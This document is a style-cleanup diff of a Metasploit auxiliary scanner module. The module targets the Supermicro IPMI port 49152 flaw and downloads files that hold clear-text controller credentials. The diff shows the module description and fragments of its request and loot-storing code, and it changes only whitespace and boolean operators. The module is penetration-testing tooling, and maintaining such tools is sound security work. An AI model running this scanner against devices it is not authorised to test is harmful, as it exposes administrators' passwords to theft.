@@ -11,16 +11,16 @@ class Metasploit3 < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
-  
+
 
   def initialize(info = {})
     super(update_info(info,
       'Name'        => 'Supermicro Onboard IPMI Port 49152 Sensitive File Exposure',
       'Description' => %q{
-        This module abuses a file exposure vulnerability accessible through the web interface 
+        This module abuses a file exposure vulnerability accessible through the web interface
         on port 49152 of Supermicro Onboard IPMI controllers.  The vulnerability allows an attacker
         to obtain detailed device information and download data files containing the clear-text
-        usernames and passwords for the controller. In May of 2014, at least 30,000 unique IPs 
+        usernames and passwords for the controller. In May of 2014, at least 30,000 unique IPs
         were exposed to the internet with this vulnerability.
       },
       'Author'       =>
@@ -51,7 +51,7 @@ class Metasploit3 < Msf::Auxiliary
         "method"    => "GET"
       })
 
-    if res and res.code == 200 and res.body.to_s =~ /supermicro/i
+    if res && res.code == 200 && res.body.to_s =~ /supermicro/i
       path = store_loot(
         'supermicro.ipmi.devicexml',
         'text/xml',
@@ -85,7 +85,7 @@ class Metasploit3 < Msf::Auxiliary
 
       next unless res
 
-      unless res.code == 200 and res.body.length > 0
+      unless res.code == 200 && res.body.length > 0
         vprint_status("#{peer} - Request for #{uri} resulted in #{res.code}")
         next
       end
